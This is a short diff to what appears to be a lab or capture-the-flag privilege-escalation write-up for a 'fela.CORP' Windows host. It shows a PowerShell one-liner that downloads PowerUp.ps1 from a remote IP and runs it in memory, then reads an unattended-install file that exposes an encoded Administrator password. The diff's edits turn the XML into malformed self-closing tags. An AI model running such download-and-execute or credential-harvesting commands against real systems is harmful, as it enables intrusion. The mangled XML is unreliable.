@@ -158,13 +158,13 @@ Found a hash value:
 ```powershell
 PS C:\Users\fela.CORP> iex(New-Object Net.WebClient).DownloadString('http://10.11.55.83/download/PowerUp.ps1')
 PS C:\Users\fela.CORP> type C:\Windows\Panther\Unattend\Unattended.xml
-<AutoLogon>
-    <Password>
-        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
-        <PlainText>false</PlainText>
+<AutoLogon />
+    <Password />
+        <Value />dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
+        <PlainText />false</PlainText>
     </Password>
-    <Enabled>true</Enabled>
-    <Username>Administrator</Username>
+    <Enabled />true</Enabled>
+    <Username />Administrator</Username>
 </AutoLogon>
 ```
 
